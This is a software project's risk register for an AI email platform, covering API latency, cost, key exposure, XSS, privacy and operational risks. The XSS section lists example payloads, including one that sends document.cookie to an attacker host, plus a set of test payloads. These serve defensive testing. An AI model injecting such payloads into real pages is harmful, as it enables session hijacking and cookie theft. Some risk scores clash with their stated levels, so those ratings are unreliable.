# Risk Register & Mitigation Strategies
## MailMind - Email Intelligence Platform

**Document Version:** 1.0  
**Last Updated:** April 13, 2026  
**Status:** Active  

---

## Executive Summary

This document identifies technical, business, and operational risks for MailMind, along with mitigation strategies and contingency plans. Risks are categorized by severity and probability, with owners assigned for monitoring.

---

## Risk Assessment Matrix

```
SEVERITY vs PROBABILITY

         PROBABILITY
         ┌────────────────────┐
         │ Low  │ Med  │ High │
         ├──────┼──────┼──────┤
    H    │ Med  │ High │ Crit │
    I    ├──────┼──────┼──────┤
    G    │ Low  │ Med  │ High │
    H    ├──────┼──────┼──────┤
         │ Low  │ Low  │ Med  │
         └──────┴──────┴──────┘
LOW  MED  HIGH
```

**Risk Score = Severity (1-5) × Probability (1-5)**
- **Critical:** 20-25 (immediate action required)
- **High:** 12-18 (monitor closely, mitigation planned)
- **Medium:** 6-11 (monitor, mitigation recommended)
- **Low:** 2-5 (monitor, mitigation optional)

---

## Technical Risks

---

### RISK-T01: OpenAI API Latency & Timeouts

**Risk Level:** 🔴 **HIGH** (Score: 16)  
**Probability:** High (gpt-4o can take 10-20s)  
**Severity:** High (blocks user workflows)  
**Owner:** Engineering Lead  
**Status:** Active  

**Description:**
OpenAI API responses are unpredictable. During peak load, gpt-4o responses can exceed 30 seconds, causing timeouts and poor user experience. This directly impacts:
- Ask feature (user expects answer in 15s)
- Draft feature (user expects draft in 10s)
- Summarize feature (user expects summary in 10s)

**Impact:**
- Users frustrated by waiting
- Feature unusable during API outages
- Higher error rates
- Potential churn if not addressed

**Mitigation Strategies:**

1. **Timeout & Retry:**
   - Set 30-second timeout for all AI requests
   - Auto-retry once on timeout
   - Show user-friendly message: "Request took longer than expected. Please try again."

2. **Caching (Phase 2):**
   - Cache enriched thread analysis
   - Cache summaries for common questions
   - Reduces redundant API calls

3. **Async Processing (Phase 2):**
   - Move AI requests to background queue (Celery)
   - Return job ID immediately
   - User polls for result
   - Better UX than blocking

4. **Model Fallback (Phase 2):**
   - If gpt-4o timeout, fallback to gpt-4o-mini
   - Slightly lower quality, but faster
   - Better than complete failure

5. **Monitoring:**
   - Track API response times per endpoint
   - Alert if 50% of requests exceed 15s
   - Log all timeouts for analysis

**Acceptance Criteria:**
- [ ] 90% of AI requests complete within 15s (during normal load)
- [ ] Timeout gracefully with user message after 30s
- [ ] Retry logic prevents double-submission
- [ ] Error messages are clear and actionable

**Contingency Plan:**
If API becomes consistently unreliable:
- Disable AI features temporarily
- Show message: "AI features temporarily unavailable. Please check back soon."
- Manual override to disable specific models

---

### RISK-T02: OpenAI API Cost Overrun

**Risk Level:** 🟠 **MEDIUM** (Score: 12)  
**Probability:** Medium (depends on usage patterns)  
**Severity:** High (budget impact)  
**Owner:** Finance / Product  
**Status:** Active  

**Description:**
With 14 threads and multiple users testing, costs can escalate quickly:
- Each Ask query: ~$0.10 (gpt-4o)
- Each Draft: ~$0.15
- Each Summarize: ~$0.05 (gpt-4o-mini)
- Daily cost for 100 users × 5 interactions: ~$75/day = $2,250/month

**Impact:**
- Unexpected budget consumption
- Difficulty justifying costs to stakeholders
- May need to discontinue MVP

**Mitigation Strategies:**

1. **Cost-Optimized Model Strategy:**
   - Use gpt-4o-mini for summarization (saves 3-5x cost)
   - Use gpt-4o only for quality-critical tasks
   - Current strategy implemented in MVP

2. **Usage Limits:**
   - Cap API calls per user/day (future)
   - Rate limiting to prevent abuse
   - User quotas for testing

3. **Monitoring & Budgets:**
   - Track daily API costs
   - Set billing alert at $100/day
   - Dashboard showing cost per feature
   - Weekly cost review

4. **Optimization:**
   - Cache results when possible
   - Batch API requests
   - Use shorter prompts (fewer tokens)

5. **Alternative Models (Future):**
   - Evaluate Claude 3 pricing
   - Compare Llama 2 self-hosted (cost: compute vs quality)
   - Open-source models as fallback

**Acceptance Criteria:**
- [ ] Daily cost tracking implemented
- [ ] Budget alerts set up
- [ ] Cost per feature measured
- [ ] Monthly cost < $1,000 for MVP phase

**Contingency Plan:**
If costs exceed $500/week:
- Disable non-essential AI features
- Implement per-user quotas
- Require OpenAI API key (let users control costs)
- Pause public testing, invite-only beta

---

### RISK-T03: Security: OpenAI API Key Exposure

**Risk Level:** 🔴 **CRITICAL** (Score: 20)  
**Probability:** Medium (common vulnerability)  
**Severity:** Critical (account compromise, financial loss)  
**Owner:** Security Lead  
**Status:** Active  

**Description:**
OpenAI API key could be exposed in:
- Frontend JavaScript code (hardcoded in app.js)
- Git history (committed accidentally)
- Logs or error messages
- Browser DevTools
- Network inspection

**Impact:**
- Unauthorized API usage
- Account compromise
- Financial loss (credit card charges)
- Email content leaked (sent to OpenAI)
- Reputational damage

**Mitigation Strategies:**

1. **Backend-Only API Key (Implemented):**
   - ✅ API key stored in backend environment variable only
   - ✅ Frontend calls backend endpoint, not OpenAI directly
   - ✅ JavaScript cannot access OpenAI key
   - This is the primary defense

2. **Environment Variable Management:**
   - ✅ Use environment variables, not hardcoded strings
   - ✅ .env files added to .gitignore
   - ✅ Include .env.example for documentation
   - Document required keys in README

3. **Secret Rotation:**
   - Rotate API key every 90 days (future)
   - Automated rotation if possible
   - Emergency rotation if suspected exposure

4. **Code Review:**
   - Pre-commit hooks to check for API key patterns
   - Security audit before production
   - Grep for "sk-" patterns in git history

5. **Monitoring:**
   - Monitor OpenAI API usage for anomalies
   - Alert on unexpected spikes
   - Log all API calls (without exposing secrets)
   - Check for calls from unexpected IPs/locations

6. **Production Deployment:**
   - Use secrets management system (HashiCorp Vault, AWS Secrets Manager)
   - Never commit secrets to git
   - Use deployment-time secret injection

**Acceptance Criteria:**
- [ ] API key not in JavaScript/frontend code
- [ ] API key not in git history
- [ ] API key not in logs or error messages
- [ ] Backend calls OpenAI, not frontend
- [ ] .env.example documents required variables

**Contingency Plan:**
If API key is exposed:
- [ ] Immediately revoke key in OpenAI console
- [ ] Generate new key
- [ ] Audit API usage for unauthorized calls
- [ ] Review email content sent to OpenAI during compromise

---

### RISK-T04: XSS Vulnerability in Email Display

**Risk Level:** 🟠 **MEDIUM** (Score: 14)  
**Probability:** Medium (email bodies are user-generated)  
**Severity:** High (malicious code execution)  
**Owner:** Security Lead  
**Status:** Mitigated  

**Description:**
Email bodies from threads could contain malicious HTML/JavaScript:
- `<img src=x onerror="fetch('https://attacker.com/?cookie=' + document.cookie)">`
- `<script>alert('XSS')</script>`
- `<iframe src="https://attacker.com"></iframe>`

**Impact:**
- Session hijacking
- Credential theft
- Malware distribution
- Data exfiltration

**Mitigation Strategies (Implemented):**

1. **HTML Escaping (✅ Implemented):**
   - All user-visible text escaped using `esc()` function
   - Special chars: `<`, `>`, `&`, `"`, `'` → HTML entities
   - Example: `<script>` → `&lt;script&gt;`
   - Applied to all email bodies, names, subjects

2. **Content Security Policy (Recommended for Phase 2):**
   ```http
   Content-Security-Policy: 
     default-src 'self'; 
     script-src 'self'; 
     style-src 'self' 'unsafe-inline';
     img-src 'self' https:;
   ```
   - Prevents inline scripts
   - Restricts external resources

3. **DOM APIs:**
   - ✅ Using textContent instead of innerHTML
   - innerHTML avoided except for controlled UI markup
   - No eval() or Function()

4. **Input Validation:**
   - Validate all API responses
   - Check data types
   - Reject unexpected data structures

5. **Regular Security Audit:**
   - Code review before production
   - Penetration testing on frontend
   - OWASP Top 10 checklist

**Acceptance Criteria:**
- [ ] Email bodies displayed as text, not HTML
- [ ] All special characters escaped
- [ ] No inline scripts in email display
- [ ] XSS payload test cases pass
- [ ] Security audit confirms no vulnerabilities

**Test Cases:**
```javascript
// XSS Payload Tests
const xssPayloads = [
  "<script>alert('XSS')</script>",
  "<img src=x onerror=alert('XSS')>",
  "<iframe src='javascript:alert(1)'></iframe>",
  "javascript:alert('XSS')",
  "<svg onload=alert('XSS')>",
];

// Should all display as escaped text, not execute
```

---

### RISK-T05: Browser Compatibility Issues

**Risk Level:** 🟡 **LOW** (Score: 6)  
**Probability:** Low (using standard APIs)  
**Severity:** Medium (users with older browsers excluded)  
**Owner:** QA Lead  
**Status:** Active  

**Description:**
Application uses modern JavaScript (ES2020) and CSS3 features:
- Fetch API (IE 11 not supported)
- Flexbox (IE 11 partial support)
- CSS Grid (IE 11 not supported)
- Template literals (IE not supported)

**Impact:**
- Users with IE 11 cannot use application
- Older browsers (Chrome 80-) may have issues
- Mobile browsers with older WebKit

**Mitigation Strategies:**

1. **Target Modern Browsers:**
   - Document minimum versions: Chrome 90+, Firefox 88+, Safari 14+, Edge 90+
   - Redirect IE 11 users with friendly message

2. **Progressive Enhancement:**
   - Core features work without JavaScript
   - Graceful degradation for missing features
   - Fallback text for CSS Grid layouts

3. **Testing:**
   - ✅ Test on Chrome, Firefox, Safari, Edge (latest)
   - ✅ Test on mobile (iOS Safari, Chrome Android)
   - Test on older browser versions (Chrome 80, Firefox 80)

4. **Documentation:**
   - Clear browser support statement in README
   - Known limitations section

**Acceptance Criteria:**
- [ ] Works on Chrome 90+, Firefox 88+, Safari 14+, Edge 90+
- [ ] Mobile responsive (iPhone 12+, Android 11+)
- [ ] Graceful error if browser not supported
- [ ] No console errors on supported browsers

---

## Business & Product Risks

---

### RISK-B01: Limited User Feedback (MVP-Only Testing)

**Risk Level:** 🟠 **MEDIUM** (Score: 12)  
**Probability:** High (no real users yet)  
**Severity:** Medium (missed product requirements)  
**Owner:** Product Manager  
**Status:** Active  

**Description:**
MVP tested with mock data and limited users (team only). Real-world usage patterns may differ:
- AI quality concerns not discovered until real emails
- Performance issues only visible with 100+ threads
- UI/UX problems not apparent in controlled testing
- Feature requests misaligned with user needs

**Impact:**
- Significant rework needed post-launch
- User disappointment
- Competitive disadvantage
- Wasted development time

**Mitigation Strategies:**

1. **Structured User Testing:**
   - Beta testing with 50-100 real users
   - Feedback surveys after each feature use
   - Conduct user interviews (5-10 users)
   - Track feature adoption metrics

2. **Instrumentation:**
   - Log which features users actually use
   - Track error rates per feature
   - Measure time-to-completion for key workflows
   - Collect satisfaction ratings

3. **Phased Rollout:**
   - Phase 1: Beta with employees only
   - Phase 2: Invite-only public beta
   - Phase 3: Full public launch
   - Gather feedback at each phase

4. **Competitive Analysis:**
   - Monitor competitor features
   - Track user requests in forums/Reddit
   - Stay informed about market trends

5. **Advisory Board:**
   - Form advisory board with 5-10 power users
   - Monthly feedback sessions
   - Early access to features

**Acceptance Criteria:**
- [ ] Beta user testing plan documented
- [ ] Feedback collection mechanism in place
- [ ] Metrics dashboard created
- [ ] User interviews scheduled (Phase 2)

**Contingency Plan:**
If user feedback is negative:
- Pivot features based on feedback
- Halt new feature development
- Focus on fixing high-impact issues
- Consider alternative pricing/positioning

---

### RISK-B02: Market Competition & Differentiation

**Risk Level:** 🟠 **MEDIUM** (Score: 10)  
**Probability:** Medium (AI email tools emerging)  
**Severity:** Medium (product not differentiated)  
**Owner:** Product Manager  
**Status:** Active  

**Description:**
Competitors (Microsoft Copilot, Google Gmail AI, Anthropic Claude) are adding similar features:
- Gmail's AI drafting & summarization
- Outlook's AI assistant
- Specialized email AI startups

Risk: Product becomes commoditized, no unique value.

**Impact:**
- Difficulty attracting users
- Pressure on pricing
- User retention challenges
- Acquisition by competitors

**Mitigation Strategies:**

1. **Unique Value Proposition:**
   - Focus on context-aware analysis (implicit needs, concerns)
   - Multi-perspective summarization (6 viewpoints)
   - Offline capability (future)
   - Privacy-first approach (no data sent to third parties)

2. **Feature Leadership:**
   - Be first to market with key features
   - Refine and polish features more than competitors
   - Continuous innovation based on user feedback

3. **Positioning:**
   - Target specific user segments first (startups, law firms, etc.)
   - Build community around the product
   - Strong content marketing

4. **Integration Strategy:**
   - Integrate with more email providers (Outlook, etc.)
   - Build API for third-party integrations
   - Partner with productivity tools

5. **Acquisition & Partnerships:**
   - Attractive acquisition target for larger companies
   - Strategic partnerships (Slack, Asana, etc.)

**Acceptance Criteria:**
- [ ] Product differentiation clearly articulated
- [ ] Competitive analysis documented
- [ ] Unique features identified
- [ ] Marketing positioning defined

---

### RISK-B03: User Privacy Concerns

**Risk Level:** 🟠 **MEDIUM** (Score: 14)  
**Probability:** Medium (emails are sensitive)  
**Severity:** High (trust and regulation)  
**Owner:** Legal / Product  
**Status:** Active  

**Description:**
Users may be hesitant to share email content with AI:
- Sensitive business information
- Confidential employee data
- Client information
- Privacy regulations (GDPR, CCPA, etc.)

**Impact:**
- Low adoption due to privacy concerns
- Legal/regulatory compliance issues
- User churn if data mishandled
- PR crisis if breach occurs

**Mitigation Strategies:**

1. **Privacy-First Design:**
   - No email data stored beyond current session
   - No data sent to OpenAI (only in Phase 1; future: on-device models)
   - Clear data retention policy
   - User controls over data usage

2. **Transparency:**
   - Privacy policy clearly written (non-technical)
   - Data handling FAQ
   - Compliance with GDPR, CCPA
   - Regular privacy audits

3. **User Controls:**
   - Users can delete their data
   - Opt-in for analytics/improvement
   - Settings for data retention
   - Data export capability

4. **Security Best Practices:**
   - HTTPS encryption in transit
   - Encrypted storage at rest (if data persisted)
   - Regular security audits
   - Bug bounty program (future)

5. **Compliance:**
   - GDPR compliance (if EU users)
   - CCPA compliance (if California users)
   - SOC 2 certification (future)
   - Regular compliance audits

**Acceptance Criteria:**
- [ ] Privacy policy documented
- [ ] Data handling transparent to users
- [ ] No unauthorized data collection
- [ ] GDPR/CCPA compliance checklist complete

---

## Operational Risks

---

### RISK-O01: Server Downtime & Reliability

**Risk Level:** 🟠 **MEDIUM** (Score: 12)  
**Probability:** Medium (single point of failure)  
**Severity:** High (users cannot access feature)  
**Owner:** DevOps / Infrastructure  
**Status:** Active  

**Description:**
MVP single server could go down:
- Server crash
- Network outage
- Deployment failure
- Security breach requiring downtime
- OpenAI API dependency failure

**Impact:**
- 100% downtime
- Users unable to access features
- Data loss if not backed up
- Loss of user trust

**Mitigation Strategies:**

1. **High Availability (Phase 2):**
   - Load balancer with 2+ server instances
   - Automatic failover
   - Health checks every 30 seconds
   - Database replication

2. **Monitoring & Alerting:**
   - Uptime monitoring (UptimeRobot, DataDog)
   - Alert on downtime within 5 minutes
   - Automated incident response
   - Dashboard showing system status

3. **Backup & Recovery:**
   - Daily backups of database
   - Automated backup verification
   - Recovery time objective (RTO): 1 hour
   - Recovery point objective (RPO): 1 hour

4. **Graceful Degradation:**
   - If database down, serve cached data
   - If AI service down, disable AI features
   - Clear messaging to users about status

5. **Incident Response:**
   - On-call rotation for critical alerts
   - Incident response runbook
   - Post-incident reviews
   - Root cause analysis

**Acceptance Criteria:**
- [ ] Uptime monitoring in place
- [ ] Backup strategy documented
- [ ] Incident response plan created
- [ ] Target uptime: 99% (MVP), 99.5% (Production)

**Contingency Plan:**
If server goes down:
- [ ] Alert on-call engineer (5 min)
- [ ] Assess severity and ETA to fix
- [ ] Communicate status to users
- [ ] Implement fix or failover
- [ ] Verify recovery
- [ ] Post-incident review

---

### RISK-O02: Team Knowledge Silos

**Risk Level:** 🟡 **LOW** (Score: 6)  
**Probability:** Low (small team currently)  
**Severity:** Medium (key person leaves)  
**Owner:** Team Lead  
**Status:** Active  

**Description:**
Single developer/owner of codebase:
- Only person who understands all systems
- No code review process
- Knowledge not documented
- Risk of departure or illness

**Impact:**
- Project stalls if developer unavailable
- Quality issues without review
- Onboarding new team members slow

**Mitigation Strategies:**

1. **Documentation:**
   - ✅ README with setup instructions
   - ✅ Architecture documentation
   - ✅ Code comments for complex logic
   - ✅ API documentation
   - Continue documenting edge cases

2. **Knowledge Sharing:**
   - Pair programming sessions
   - Code walkthroughs with team
   - Architecture design reviews
   - Lunch-and-learn sessions

3. **Code Review Process:**
   - PR reviews before merge
   - At least 1 reviewer per PR
   - Documented review checklist

4. **Automation:**
   - Automated tests (unit, integration)
   - CI/CD pipeline
   - Linting and formatting checks
   - Automated deployments

5. **Cross-Training:**
   - Team member shadows codebase
   - Rotating code review responsibility
   - Documentation improvements

**Acceptance Criteria:**
- [ ] Documentation covers architecture & key features
- [ ] Code review process defined
- [ ] Tests automated
- [ ] Onboarding guide created

---

### RISK-O03: Dependency Maintenance

**Risk Level:** 🟡 **LOW** (Score: 8)  
**Probability:** Medium (dependencies need updates)  
**Severity:** Low (workarounds available)  
**Owner:** Engineering Lead  
**Status:** Active  

**Description:**
Project depends on external libraries that need maintenance:
- FastAPI (updates 4-6x per year)
- OpenAI SDK (frequent updates)
- Python (version support ends)
- Browser APIs (standards evolve)

**Impact:**
- Security vulnerabilities in old dependencies
- Breaking changes in updates
- Compatibility issues
- Tech debt accumulation

**Mitigation Strategies:**

1. **Dependency Management:**
   - requirements.txt with pinned versions
   - Regular dependency audits (monthly)
   - Security advisory subscriptions
   - Automated dependency updates (Dependabot)

2. **Version Control:**
   - Document breaking changes
   - Test new versions before updating
   - Gradual rollout of updates
   - Keep patch versions compatible

3. **Security:**
   - Monitor CVE alerts
   - Test security patches immediately
   - Automate security scanning

4. **Documentation:**
   - Document minimum version requirements
   - Maintain CHANGELOG
   - Record breaking changes

**Acceptance Criteria:**
- [ ] Dependency audit process established
- [ ] Security scanning in CI/CD
- [ ] Version requirements documented
- [ ] Update schedule defined (monthly)

---

## Risk Monitoring & Review

### Risk Review Schedule
- **Weekly:** Critical risks (T03)
- **Bi-weekly:** High risks (T01, T02, B02)
- **Monthly:** Medium & low risks (all others)

### Risk Review Meeting Agenda
1. Status of each active risk
2. Probability/severity updates
3. Mitigation effectiveness
4. New risks identified
5. Risk owner assignments
6. Action items and deadlines

### Risk Register Maintenance
- Update risk status quarterly
- Close risks when mitigated
- Archive historical risks
- Create new risks as identified

---

## Appendix: Risk Escalation Path

### Critical Risk (Score 20+)
- **Immediate:** Alert executive stakeholder
- **Within 1 hour:** Emergency response meeting
- **Within 4 hours:** Mitigation plan in place
- **Within 1 day:** Mitigation implementation started

### High Risk (Score 12-18)
- **Within 2 hours:** Alert project owner
- **Within 1 day:** Risk assessment & mitigation planning
- **Within 1 week:** Mitigation implementation

### Medium Risk (Score 6-11)
- **Within 1 week:** Risk assessment
- **Within 2 weeks:** Mitigation planning
- **Within 1 month:** Mitigation implementation

### Low Risk (Score 2-5)
- **Monthly:** Review and assess
- **Quarterly:** Mitigation if feasible
- **Archive:** If risk probability decreases

---

## Appendix: Risk Response Options

For each risk, consider four response strategies:

1. **Avoid:** Eliminate the risk by changing approach
   - Example: Avoid OpenAI costs by using open-source models

2. **Mitigate:** Reduce probability or severity
   - Example: Implement caching to reduce API calls

3. **Transfer:** Shift risk to third party
   - Example: Use managed service instead of self-hosted

4. **Accept:** Acknowledge risk and plan contingency
   - Example: Accept browser compatibility risk, document minimum versions

---

**Document Approved By:** Executive Team  
**Last Updated:** April 13, 2026  
**Next Review Date:** May 13, 2026  
**Contact:** risk-management@company.com
